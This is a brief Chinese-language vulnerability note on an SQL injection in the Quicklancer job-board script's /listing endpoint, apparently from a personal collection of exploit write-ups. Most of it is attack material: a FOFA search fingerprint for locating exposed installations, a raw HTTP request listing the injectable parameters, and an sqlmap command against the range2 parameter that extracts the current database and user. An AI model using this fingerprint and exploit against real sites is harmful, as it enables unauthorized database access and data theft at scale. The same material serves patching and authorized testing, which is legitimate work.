# Quicklancer listing存在SQL注入漏洞

# 一、漏洞简介
Quicklancer listing存在SQL注入漏洞

# 二、影响版本
+ Quicklancer 

# 三、资产测绘
+ fofa`"service_fragments/css/gig_detail.css"`

![1722357327737-2f75dc76-450b-4762-baaf-f6cb6b6db449.png](./img/Zctu3AEtWqtDqQ_6/1722357327737-2f75dc76-450b-4762-baaf-f6cb6b6db449-311413.png)

# 四、漏洞复现
```java
GET /listing?cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1&salary-type=1&sort=id&subcat= HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

```java
python3 sqlmap.py -r test.txt -p range2 --dbms=mysql --current-db --current-user --batch
```

![1722357353437-b723d9d3-47f0-445d-8cae-7a8b96f7c899.png](./img/Zctu3AEtWqtDqQ_6/1722357353437-b723d9d3-47f0-445d-8cae-7a8b96f7c899-327561.png)



> 更新: 2024-08-12 17:15:58  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ggplqb9der0o0i5m>